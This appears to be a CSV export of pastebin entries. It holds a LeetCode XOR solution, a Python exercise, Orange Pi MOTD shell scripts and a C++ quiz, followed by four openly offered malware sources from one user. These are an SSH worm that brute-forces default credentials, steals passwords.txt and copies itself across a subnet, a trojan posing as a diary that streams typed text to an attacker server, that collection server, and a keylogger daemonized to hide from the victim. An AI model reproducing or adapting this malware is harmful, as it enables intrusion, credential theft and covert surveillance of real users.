id,title,username,language,date,content
e9YRKYjY,136. Single Number,micahbales,JavaScript,Friday 20th of October 2023 12:58:12 AM CDT,"/**
* Problem statement: https://leetcode.com/problems/single-number/
*
* This solution requires two passes over the array of numbers, due to the strategy requiring the array to be sorted first.
* Time and space complexity are both O(n) - due to the sorted list probably taking O(n) space
* (depending on the interpreter's implementation).
*
* This answer actually fails the criteria for the question, but was my first pass. 
* See below for a more efficient, but non-obvious, solution.
*/

/**
 * @param {number[]} nums
 * @return {number}
 */
var singleNumber = function(nums) {
    const sortedNums = nums.sort();
    
    for (i = 0; i < sortedNums.length; i++) {
        const curr = sortedNums[i];
        const prev = sortedNums[i - 1];
        const next = sortedNums[i + 1];
        
        if (curr === prev || curr === next) continue;
        return curr;
    }
};

/**
* It turns out that the way that one is supposed to solve this problem for O(n) time and O(1) space is using the
* XOR bitwise operator to calculate the number. For example, see this one line solution that is possible:
*/

const singleNumber = nums => nums.reduce((res, num) => res ^ num, 0);

/**
* The above, one-line solution works because: 0 ^ 3 ^ 1 ^ 4 ^ 3 ^ 1 = 4.
*
* _That_ works because XOR operations work like this:
* 
* 0 | 0 0 0 0
* ^ |
* 3 | 0 0 1 1
* -----------
* 3 | 0 0 1 1
* 
* 3 | 0 0 1 1
* ^ |
* 1 | 0 0 0 1
* -----------
* 2 | 0 0 1 0
* 
* 2 | 0 0 1 0
* ^ |
* 4 | 0 1 0 0
* -----------
* 6 | 0 1 1 0
* 
* 6 | 0 1 1 0
* ^ |
* 3 | 0 0 1 1
* -----------
* 5 | 0 1 0 1
* 
* 5 | 0 1 0 1
* ^ |
* 1 | 0 0 0 1
* -----------
* 4 | 0 1 0 0
* 
* Ending up with a value of 4, the single number that has no pair in the sequence 0 ^ 3 ^ 1 ^ 4 ^ 3 ^ 1.
*
* Once you know this, the solution is trivial. _Once you know this._
*/

"
r1rtQ5yY,Guinea Pig,MNNM2021,Python,Friday 20th of October 2023 12:57:05 AM CDT,"# food = float(input())
# hay = float(input())
# cover = float(input())
#
# guinea_pig_weight = float(input())
#
# month = 30
#
# daily_food = 0.300
# monthly_needs_food = month * daily_food
#
#
# not_enough = False
#
# while food >= monthly_needs_food:
#     for f in range(1, month + 1):
#         food -= daily_food
#         if food > 0:
#             excess_food = food
#         else:
#             not_enough = True
#             break
#         if f % 2 == 0:
#             hay -= 0.05 * excess_food # ако се счупи виж пак food
#             if hay > 0:
#                 excess_hay = hay
#             else:
#                 not_enough = True
#                 break
#         if f % 3 == 0:
#             cover -= guinea_pig_weight / 3
#             if cover > 0:
#                 excess_cover = cover
#             else:
#                 not_enough = True
#                 break
#
# if not_enough:
#     print(""Merry must go to the pet store!"")
# else:
#     print(f""Everything is fine! Puppy is happy! Food: {food:.2f}, Hay: {hay:.2f}, Cover: {cover:.2f}."")


food = float(input())
hay = float(input())
cover = float(input())
guinea_pig_weight = float(input())
month = 30
daily_food = 0.300
monthly_needs_food = month * daily_food
not_enough = False

while True:
    if food <= 0 or hay <= 0 or cover <= 0:
        not_enough = True
        break

for day in range(month):
    if day % 2 == 0:
        food -= daily_food
        excess_food = max(food, 0)
        hay_used = excess_food * 0.05
        hay -= hay_used
        excess_hay = max(hay, 0)

    if day % 3 == 0:
        cover_used = guinea_pig_weight / 3
        cover -= cover_used
        if cover < 0:
            excess_cover = 0
        else:
            excess_cover = cover

if not not_enough:
    print(f""Everything is fine! Puppy is happy! Food: {food:.2f}, Hay: {hay:.2f}, Cover: {cover:.2f}."")
else:
    print(""Merry must go to the pet store!"")

"
uQRKHdDh,30-sysinfo,iax,Bash,Friday 20th of October 2023 12:09:15 AM CDT,"#!/bin/bash
#
# Copyright (c) Authors: https://www.armbian.com/authors
#
# This file is licensed under the terms of the GNU General Public
# License version 2. This program is licensed ""as is"" without any
# warranty of any kind, whether express or implied.
#
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
THIS_SCRIPT=""sysinfo""

# don't change default values - they are lost on upgrades. Use /etc/default/orangepi-motd for your values

MOTD_DISABLE=""""
PRIMARY_INTERFACE=""eth0""
PRIMARY_DIRECTION=""rx""
STORAGE=/dev/sda1
HIDE_IP_PATTERN=""^dummy0|^lo""
CPU_TEMP_LIMIT=60
# Temperature offset in Celcius degrees
CPU_TEMP_OFFSET=0
HDD_TEMP_LIMIT=60
AMB_TEMP_LIMIT=40

for f in $MOTD_DISABLE; do
	[[ $f == $THIS_SCRIPT ]] && exit 0
done

# don't edit below here

function display() {
	# $1=name $2=value $3=red_limit $4=minimal_show_limit $5=unit $6=after $7=acs/desc{
	# battery red color is opposite, lower number
	if [[ ""$1"" == ""Battery"" ]]; then local great=""<""; else local great="">""; fi
	if [[ -n ""$2"" && ""$2"" > ""0"" && (( ""${2%.*}"" -ge ""$4"" )) ]]; then
		printf ""%-14s"" ""$1:""
		if awk ""BEGIN{exit ! ($2 $great $3)}""; then echo -ne ""\e[0;91m $2""; else echo -ne ""\e[0;92m $2""; fi
		printf ""%-1s\x1B[0m"" ""$5""
		printf ""%-11s\t"" ""$6""
		return 1
	fi
} # display

function getboardtemp() {
	if [ -f /etc/orangepimonitor/datasources/soctemp ]; then
		read raw_temp </etc/orangepimonitor/datasources/soctemp 2>/dev/null
		if [ ! -z $(echo ""$raw_temp"" | grep -o ""^[1-9][0-9]*\.\?[0-9]*$"") ] && (( $(echo ""${raw_temp} < 200"" |bc -l) )); then
			# Allwinner legacy kernels output degree C
			board_temp=${raw_temp}
		else
			board_temp=$(awk '{printf(""%d"",$1/1000)}' <<<${raw_temp})
		fi
	elif [ -f /etc/orangepimonitor/datasources/pmictemp ]; then
		# fallback to PMIC temperature
		board_temp=$(awk '{printf(""%d"",$1/1000)}' </etc/orangepimonitor/datasources/pmictemp)
	fi
	# Some boards, such as the Orange Pi Zero LTS, report shifted CPU temperatures
	board_temp=$((board_temp + CPU_TEMP_OFFSET))
} # getboardtemp

function batteryinfo() {
	# Battery info for Allwinner
	mainline_dir=""/sys/power/axp_pmu""
	legacy_dir=""/sys/class/power_supply""
	if [[ -e ""$mainline_dir"" ]]; then
		read status_battery_connected < $mainline_dir/battery/connected 2>/dev/null
		if [[ ""$status_battery_connected"" == ""1"" ]]; then
			read status_battery_charging < $mainline_dir/charger/charging
			read status_ac_connect < $mainline_dir/ac/connected
			read battery_percent< $mainline_dir/battery/capacity
			# dispay charging / percentage
			if [[ ""$status_ac_connect"" == ""1"" && ""$battery_percent"" -lt ""100"" ]]; then
				status_battery_text="" charging""
			elif [[ ""$status_ac_connect"" == ""1"" && ""$battery_percent"" -eq ""100"" ]]; then
				status_battery_text="" charged""
			else
				status_battery_text="" discharging""
			fi
		fi
	elif [[ -e ""$legacy_dir/axp813-ac"" ]]; then
		read status_battery_connected < $legacy_dir/axp20x-battery/present
		if [[ ""$status_battery_connected"" == ""1"" ]]; then
			status_battery_text="" ""$(awk '{print tolower($0)}' < $legacy_dir/axp20x-battery/status)
			read status_ac_connect < $legacy_dir/axp813-ac/present
			read battery_percent< $legacy_dir/axp20x-battery/capacity
		fi
	elif [[ -e ""$legacy_dir/battery"" ]]; then
		if [[ ((""$(cat $legacy_dir/battery/voltage_now)"" -gt ""5"" )) ]]; then
			status_battery_text="" ""$(awk '{print tolower($0)}' < $legacy_dir/battery/status)
			read battery_percent <$legacy_dir/battery/capacity
		fi
	fi
} # batteryinfo

function ambienttemp() {
	# define where w1 usually shows up
        W1_DIR=""/sys/devices/w1_bus_master1/""
	if [ -f /etc/orangepimonitor/datasources/ambienttemp ]; then
		read raw_temp </etc/orangepimonitor/datasources/ambienttemp 2>/dev/null
		amb_temp=$(awk '{printf(""%d"",$1/1000)}' <<<${raw_temp})
		echo $amb_temp
	elif [[ -d $W1_DIR && $ONE_WIRE == yes ]]; then
		device=$(ls -1 $W1_DIR | grep -E '^[0-9]{1,4}' | head -1)
		if [[ -n $device ]]; then
			read raw_temp < ${W1_DIR}${device}/hwmon/$(ls -1 ${W1_DIR}${device}/hwmon)/temp1_input 2>/dev/null
			amb_temp=$(awk '{printf(""%d"",$1/1000)}' <<<${raw_temp})
			echo $amb_temp
		fi
	else
		# read ambient temperature from USB device if available
		if [[ ! -f /usr/bin/temper ]]; then
			echo """"
			return
		fi
		amb_temp=$(temper -c 2>/dev/null)
		case ${amb_temp} in
			*""find the USB device""*)
				echo """"
				;;
			*)
				amb_temp=$(awk '{print $NF}' <<<$amb_temp |  sed 's/C//g')
				echo -n ""scale=1;${amb_temp}/1"" | grep -oE ""\-?[[:digit:]]+\.[[:digit:]]""
		esac
	fi
} # ambienttemp

function get_ip_addresses() {
	local ips=()
	for f in /sys/class/net/*; do
		local intf=$(basename $f)
		# match only interface names ""dummy0"" and ""lo""
		if [[ $intf =~ $HIDE_IP_PATTERN ]]; then
			continue
		else
			local tmp=$(ip -4 addr show dev $intf | grep -v ""$intf:avahi"" | awk '/inet/ {print $2}' | cut -d'/' -f1)
			# add both name and IP - can be informative but becomes ugly with long persistent/predictable device names
			#[[ -n $tmp ]] && ips+=(""$intf: $tmp"")
			# add IP only
			[[ -n $tmp ]] && ips+=(""$tmp"")
		fi
	done
	echo ""${ips[@]}""
} # get_ip_addresses

function storage_info() {
	# storage info
	RootInfo=$(df -h /)
	root_usage=$(awk '/\// {print $(NF-1)}' <<<${RootInfo} | sed 's/%//g')
	root_total=$(awk '/\// {print $(NF-4)}' <<<${RootInfo})
	StorageInfo=$(df -h $STORAGE 2>/dev/null | grep $STORAGE)
	if [[ -n ""${StorageInfo}"" && ${RootInfo} != *$STORAGE* ]]; then
		storage_usage=$(awk '/\// {print $(NF-1)}' <<<${StorageInfo} | sed 's/%//g')
		storage_total=$(awk '/\// {print $(NF-4)}' <<<${StorageInfo})
		if [[ -n ""$(command -v smartctl)"" ]]; then
			DISK=""${STORAGE::-1}""
			storage_temp+=$(smartctl -l scttempsts $DISK 2> /dev/null | grep -i 'Current Temperature:' | awk '{print $(NF-1)}')
		fi
	fi
} # storage_info



# query various systems and send some stuff to the background for overall faster execution.
# Works only with ambienttemp and batteryinfo since A20 is slow enough :)
amb_temp=$(ambienttemp &)
ip_address=$(get_ip_addresses &)
batteryinfo
storage_info
getboardtemp
critical_load=80

# get uptime, logged in users and load in one take
UPTIME=$(LC_ALL=C uptime)
UPT1=${UPTIME#*'up '}
UPT2=${UPT1%'user'*}
users=${UPT2//*','}
users=${users//' '}
time=${UPT2%','*}
time=${time//','}
time=$(echo $time | xargs)
load=${UPTIME#*'load average: '}
load=${load//','}
load=$(echo $load | cut -d"" "" -f1)
[[ $load == 0.0* ]] && load=0.10
cpucount=$(grep -c processor /proc/cpuinfo)

load=$(awk '{printf(""%.0f"",($1/$2) * 100)}' <<< ""$load $cpucount"")

# memory and swap
mem_info=$(LC_ALL=C free -w 2>/dev/null | grep ""^Mem"" || LC_ALL=C free | grep ""^Mem"")
memory_usage=$(awk '{printf(""%.0f"",(($2-($4+$6+$7))/$2) * 100)}' <<<${mem_info})
mem_info=$(echo $mem_info | awk '{print $2}')
memory_total=$(( mem_info / 1024 ))
swap_info=$(LC_ALL=C free -m | grep ""^Swap"")
swap_usage=$( (awk '/Swap/ { printf(""%3.0f"", $3/$2*100) }' <<<${swap_info} 2>/dev/null || echo 0) | tr -c -d '[:digit:]')
swap_total=$(awk '{print $(2)}' <<<${swap_info})

# display info
display ""System load"" ""${load%% *}"" ""${critical_load}"" ""0"" ""%"" """"

printf ""Up time:       \x1B[92m%s\x1B[0m\t"" ""$time""
display ""Local users"" ""${users##* }"" ""3"" ""2"" """"
echo """" # fixed newline
if [[ ${memory_total} -gt 1000 ]]; then
	memory_total=$(awk '{printf(""%.2f"",$1/1024)}' <<<${memory_total})""G""
else
	memory_total+=""M""
fi

if [[ ${swap_total} -gt 500 ]]; then
	swap_total=$(awk '{printf(""%.2f"",$1/1024)}' <<<${swap_total})""G""
else
	swap_total+=""M""
fi

display ""Memory usage"" ""$memory_usage"" ""70"" ""0"" ""%"" "" of ${memory_total}""
display ""Zram usage"" ""$swap_usage"" ""75"" ""0"" ""%"" "" of ${swap_total}""
printf ""IP:	       ""
printf ""\x1B[92m%s\x1B[0m"" ""$ip_address""
echo """" # fixed newline
display ""CPU temp"" ""$board_temp"" $CPU_TEMP_LIMIT ""0"" ""°C"" """"
display ""Ambient temp"" ""$amb_temp"" $AMB_TEMP_LIMIT ""0"" ""°C"" """"
display ""Usage of /"" ""$root_usage"" ""90"" ""1"" ""%"" "" of $root_total""
echo """" # fixed newline
a=0
display ""storage/"" ""$storage_usage"" ""90"" ""1"" ""%"" "" of $storage_total"" ; a=$((a+$?))
display ""storage temp"" ""$storage_temp"" $HDD_TEMP_LIMIT ""0"" ""°C"" """" ; a=$((a+$?))
display ""Battery"" ""$battery_percent"" ""20"" ""1"" ""%"" ""$status_battery_text"" ; a=$((a+$?))
(( $a > 0 )) && echo """" # new line only if some value is displayed

# Check whether PRIMARY_INTERFACE exist in /var/lib/vnstat/
PRIMARY_INTERFACE=$(comm -12 <(ls -1 /var/lib/vnstat/ 2> /dev/null) <(echo ""$PRIMARY_INTERFACE"" | sed 's/+/\n/g') | sed -n -e 'H;${x;s/\n/+/g;s/^+//;p;}')

line=0
if [[ $(command -v vnstat) && -n $PRIMARY_INTERFACE ]]; then
	traffic=$(vnstat -i $PRIMARY_INTERFACE --oneline | cut -d"";"" -f4,5)
	traffic_rx=$(echo $traffic | cut -d"";"" -f1,1 | sed -r 's/([0-9]+\.[0-9]{1})[0-9]*/\1/')
	traffic_tx=$(echo $traffic | cut -d"";"" -f2,2 | sed -r 's/([0-9]+\.[0-9]{1})[0-9]*/\1/')
	[[ ""$traffic"" == *""Not enough""* ]] && { traffic_tx=""n/a	""; traffic_rx=""n/a	""; }
	case $PRIMARY_DIRECTION in
		tx)
			printf ""TX today:      \x1B[92m%s\x1B[0m  \t""  ""$traffic_tx""
			line=$((line+1))
		;;
		rx)
			printf ""RX today:      \x1B[92m%s\x1B[0m  \t""  ""$traffic_rx""
			line=$((line+1))
		;;
		both)
			printf ""TX today:      \x1B[92m%s\x1B[0m  \t""  ""$traffic_tx""
			printf ""RX today:      \x1B[92m%s\x1B[0m  \t""  ""$traffic_rx""
			line=$((line+1))
		;;
		*) #off or whatever
		;;
	esac
fi

if [[ $(command -v zpool) ]]; then
	zpoolstatus=""$(zpool status </dev/stdin 2>&1 )""
	if [[ -n $(echo $zpoolstatus | grep 'not loaded') ]]; then
	:
	elif [[ -n $(echo $zpoolstatus | grep 'degraded\|OFFLINE') ]]; then
		printf ""ZFS pool:      ""
		echo -ne ""\e[0;91mDegraded\x1B[0m""
		line=$((line+1))
	elif [[ -n $(echo $zpoolstatus | grep 'no pools available') ]]; then
		printf ""ZFS pool:      ""
		echo -ne ""n/a""
		line=$((line+1))
	else
		printf ""ZFS pool:      ""
		echo -ne ""\e[0;92mOnline\x1B[0m""
		line=$((line+1))
	fi
fi
[[ $line -ne 0 ]] && echo """"
echo """"
"
AgsmWs8Y,10-header_2,iax,Bash,Friday 20th of October 2023 12:03:37 AM CDT,"#!/bin/sh

# redirect errors to stdout -- just in case
exec 2>&1

LOGO=$(echo 'pi 2' | awk '{print toupper($0)}' | figlet -tc -f ANSI\ Shadow)

. /etc/os-release
KERNELID=$(uname -r)

echo ""\e[0;94m$LOGO\e[0m""
echo ""Welcome to \e[0;91m${PRETTY_NAME}\e[0m with \e[0;91mLinux $KERNELID\e[0m\n""
"
3LV2sxeY,Linked List Question and Answer,X6Galixia,C++,Thursday 19th of October 2023 11:57:45 PM CDT,"#include <iostream>
#include <string>

struct Node {
    std::string question;
    std::string answer;
    Node* next;
};

class Quiz {
private:
    Node* head;
    int score;
public:
    Quiz() : head(NULL), score(0) {}

    void addQuestion(std::string question, std::string answer) {
        Node* newNode = new Node();
        newNode->question = question;
        newNode->answer = answer;
        newNode->next = head;
        head = newNode;
    }

    void startQuiz() {
        Node* temp = head;
        std::string userAnswer;

        while (temp != NULL) {
            std::cout << temp->question << std::endl;
            std::cin >> userAnswer;

            if (userAnswer == temp->answer) {
                score++;
                std::cout << ""Correct!"" << std::endl;
            }
            else {
                std::cout << ""Wrong! The correct answer is: "" << temp->answer << std::endl;
            }

            temp = temp->next;
        }

        std::cout << ""Your score is: "" << score << ""/10"" << std::endl;
    }
};

int main() {
    Quiz quiz;

    // Add your questions and answers here
    quiz.addQuestion(""What is 2^2 ?"", ""4"");
    quiz.addQuestion(""What is inches in centimeter"", ""2.54"");
    quiz.addQuestion(""A number system that only contains 1 and 0"", ""binary"");
    quiz.addQuestion(""What is 1 + 1"", ""2"");
    quiz.addQuestion(""A pulse in binary"", ""bit"");
    quiz.addQuestion(""If theres a fruit name orange what is the color of the fruit?"", ""orange"");
    quiz.addQuestion(""If i have a bird that doesnt fly what is the name of my bird?"", ""2.54"");
    quiz.addQuestion(""A bird that that has wings but doesnt fly"", ""ostrich"");
    quiz.addQuestion(""What is the derivative of x"", ""1"");
    quiz.addQuestion(""What is the integral of x^2"", ""1/2x"");

    quiz.startQuiz();

    return 0;
}
"
MR96gfD9,10-header,iax,Bash,Thursday 19th of October 2023 11:51:29 PM CDT,"#!/bin/sh

cat <<HEADER

    ██████╗ ██╗    ██████╗ 
    ██╔══██╗██║    ╚════██╗
    ██████╔╝██║     █████╔╝
    ██╔═══╝ ██║    ██╔═══╝ 
    ██║     ██║    ███████╗
    ╚═╝     ╚═╝    ╚══════╝

HEADER

. /etc/os-release
KERNELID=$(uname -r)
#TERM=linux toilet --gay -f smmono12 $(hostname)
echo ""Welcome to \e[0;91m${PRETTY_NAME}\e[0m with \e[0;91mLinux $KERNELID\e[0m\n""
"
SUW9qrrd,sshworm.py,FlyFar,Python,Thursday 19th of October 2023 11:43:42 PM CDT,"#!/usr/bin/env python3

"""""" Implementation of simple worm that spreads via SSH connection.
""""""

import logging
import paramiko
import scp
import sys


class Worm:
    """""" This class represents implementation of worm that spreads via SSH
    connections.
    """"""

    def __init__(self, network_address):
        self._network = network_address

    @property
    def network(self):
        """""" Network, on which the worm spreads. """"""
        return self._network

    @network.setter
    def network(self, new_network):
        self._network = new_network

    @property
    def credentials(self):
        """""" Possible SSH credentials of the victim. """"""
        return (
            ('user', 'user'),
            ('root', 'root'),
            ('msfadmin', 'msfadmin')
        )

    def generate_addresses_on_network(self):
        """""" Generate addresses of hosts on the given network.
        For simplicity is expected the following mask:
        255.255.255.0
        """"""
        network = self.network.split('.')
        for host in range(1, 256):
            network[-1] = str(host)
            yield '.'.join(network)

    def spread_via_ssh(self):
        """""" Spread the worm on the network via SSH connections.
        To establish SSH connection try selected user-password
        combinations. When the connection is established, copy
        the worm to the remote host.
        """"""
        # Setup SSH client.
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for remote_address in self.generate_addresses_on_network():
            logging.debug('Trying to spread on the remote host: {}'.format(remote_address))
            print()

            for user, passw in self.credentials:
                try:
                    ssh.connect(remote_address, port=22, username=user, password=passw, timeout=10)
                    logging.debug('The worm is succesfully connected to the remote host [{}, {}].'.format(user, passw))

                    # Create SCP client for file transmission.
                    with scp.SCPClient(ssh.get_transport()) as scp_client:
                        # Obtain file with victim's passwords.
                        try:
                            scp_client.get('passwords.txt')
                            logging.debug('The victim had passwords.txt')
                        except Exception:
                            logging.debug('The victim did not have passwords.txt')

                        # Upload worm to the remote host.
                        try:
                            scp_client.put(sys.argv[0])
                            logging.debug('The worm has been uploaded to victim')
                        except Exception:
                            logging.debug('The worm could not be uploaded to victim')

                    print()
                except Exception:
                    logging.debug('The remote host refused connection with credentials {},{}.'.format(user, passw))
                    print()

        ssh.close()

if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)
    # Disable basic logging of paramiko to make log easier to read.
    logging.getLogger('paramiko').setLevel(logging.CRITICAL)

    # Initialize worm with the network address.
    worm = Worm('198.168.0.0')
    # Spread via SSH connection on the network.
    worm.spread_via_ssh()"
BLLdTa0f,trojan/trojan.py,FlyFar,Python,Thursday 19th of October 2023 11:42:35 PM CDT,"#!/usr/bin/env python3

"""""" Implementation of trojan that collects data and sends them to server.
    It acts like an ordinary diary.
""""""

import logging
import socket
import sys


class Trojan:
    """""" This class represents the implementation of trojan disguised
        as diary.
    """"""

    def __init__(self, host, port):
        self._host = host
        self._port = port
        # Initialize socket for the connection.
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def host(self):
        """""" Server that collects obtained data. """"""
        return self._host

    @host.setter
    def host(self, new_host):
        self._host = new_host

    @property
    def port(self):
        """""" Port, on which the server runs (`int`). """"""
        return self._port

    @port.setter
    def port(self, new_port):
        self._port = new_port

    @property
    def socket(self):
        """""" Client socket. """"""
        return self._socket

    def collect_data(self):
        """""" Secretly collect data and send them to server. """"""
        # Create a connection to the server.
        try:
            self.socket.connect((self.host, self.port))
        except socket.error:
            logging.debug('Trojan could not connect to the server.')
            return

        # Try to act as an ordinary diary.
        print('Hello, this is your diary. You can type here your notes: ')

        # Read notes written by the victim and send them to the server.
        while True:
            character = sys.stdin.read(1)
            self.socket.send(bytes(character, 'utf-8'))


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Initialize trojan application that acts like an diary.
    trojan = Trojan('localhost', 27000)
    # Collect the data and send them to the server running
    # on the attacket's side.
    trojan.collect_data()"
5rxuwu8K,trojan/server.py,FlyFar,Python,Thursday 19th of October 2023 11:41:50 PM CDT,"#!/usr/bin/env python3

"""""" Implementation of the server that collects data sent by trojan.
""""""

import logging
import socket


class Server:
    """""" This class represents a server of the attacker that
    collects data from the victim.
    """"""

    def __init__(self, port):
        self._port = port
        # Initialize the socket for connection.
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def port(self):
        """""" Port, on which the server runs (`int`). """"""
        return self._port

    @port.setter
    def port(self, new_port):
        self._port = new_port

    @property
    def socket(self):
        """""" Server socket. """"""
        return self._socket

    def initialize(self):
        """""" Initialize server before session. """"""
        try:
            self.socket.bind(('localhost', self._port))
            self.socket.listen()
            logging.debug('Server was successfully initialized.')
        except socket.error:
            print('Server was not initialized due to an error.')

    def collect_data(self):
        """""" Collect data from client trojan application. """"""
        # Establish a connection with the victim.
        connection, address = self.socket.accept()
        with connection:
            print('Connection with trojan established from {}'.format(address))

            # Receive data sent by trojan diary.
            while True:
                data = connection.recv(1024)
                if not data:
                    break
                logging.info(data)


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create and initialize a server running on attacker's side.
    server = Server(27000)
    server.initialize()
    # Collect the data sent by trojan that was executed on victim's side.
    server.collect_data()"
BWgycaDb,keylogger.py,FlyFar,Python,Thursday 19th of October 2023 11:40:52 PM CDT,"#!/usr/bin/env python3

"""""" Implementation of simple keylogger in Python.
""""""

import daemon
import logging
import pyxhook


class Keylogger:
    """""" This class represents the code injecting malware. """"""

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """""" Name of the malware. """"""
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    def start_logging(self):
        """""" Log every keystroke of the user into log file. """"""
        # Crete hook manager.
        hook_manager = pyxhook.HookManager()
        # Assign callback for handling key strokes.
        hook_manager.KeyDown = self._keydown_callback
        # Hook the keyboard and start logging.
        hook_manager.HookKeyboard()
        hook_manager.start()

    def _keydown_callback(self, key):
        """""" This function is handler of key stroke event. """"""
        logging.debug(chr(key.Ascii))


if __name__ == '__main__':
    # Setup logger.
    logging.basicConfig(
        level=logging.DEBUG,
        filename='activity.log',
        format='Key: %(message)s',
    )
    # Get file handler. We need to pass it to our daemon.
    handler = logging.getLogger().handlers[0].stream

    # Daemonize the process to hide it from the victim.
    with daemon.DaemonContext(files_preserve=[handler]):
        # Create keylogger.
        keylogger = Keylogger('SimpleSpyware')
        # Start logging activity of the user.
        keylogger.start_logging()"
